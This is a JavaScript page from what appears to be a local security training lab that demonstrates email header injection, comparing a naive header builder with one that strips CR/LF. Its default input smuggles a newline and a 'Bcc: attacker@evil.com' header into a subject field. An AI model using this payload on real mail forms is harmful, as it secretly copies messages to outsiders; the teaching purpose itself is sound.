Lab.registerPage('header-injection', {
  render(container) {
    const body = Lab.renderLayout(container, { title: 'Header Injection', route: 'header-injection' });
    body.innerHTML = '';

    body.appendChild(Lab.el('p', { class: 'error-block', style: 'padding:12px 16px;border-radius:8px;' }, 'This is a deliberately vulnerable code path, kept local-only for demonstration. It never touches a real mail transport.'));

    const subjectInput = Lab.el('textarea', {}, 'Order confirmation\nBcc: attacker@evil.com');
    const output = Lab.el('div', {});

    body.appendChild(Lab.el('label', {}, 'Subject field value (press Enter to include a raw newline, simulating unsanitized user input)'));
    body.appendChild(subjectInput);
    body.appendChild(Lab.el('button', {
      onclick: async () => {
        const res = await Lab.fetchJSON('/api/headers/injection-demo', { method: 'POST', body: { subjectInput: subjectInput.value } });
        output.innerHTML = '';
        output.appendChild(Lab.el('p', {}, Lab.el('span', { class: `badge ${res.injected ? 'fail' : 'pass'}` }, res.injected ? 'injection succeeded' : 'no injection (no CR/LF present)')));

        output.appendChild(Lab.el('h4', {}, 'Vulnerable builder (naive string concatenation)'));
        output.appendChild(Lab.el('pre', { class: 'code-block' }, res.vulnerableOutput));
        output.appendChild(Lab.el('p', { class: 'muted' }, `A real parser would read this as ${res.parsedLineCount} header line(s) instead of the intended ${res.originalFieldCount}.`));

        output.appendChild(Lab.el('h4', {}, 'Safe builder (strips CR/LF from values before building headers)'));
        output.appendChild(Lab.el('pre', { class: 'code-block' }, res.safeOutput));
      },
    }, 'Build headers'));
    body.appendChild(output);
  },
});
